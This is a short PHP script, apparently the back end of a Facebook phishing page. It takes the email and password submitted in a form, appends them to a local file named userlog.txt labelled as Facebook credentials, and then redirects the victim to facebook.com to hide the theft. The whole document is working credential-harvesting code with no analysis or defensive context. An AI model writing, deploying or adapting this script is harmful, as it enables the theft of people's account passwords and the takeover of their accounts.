<?php

file_put_contents("userlog.txt", "Facebook Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://facebook.com');
exit();
?>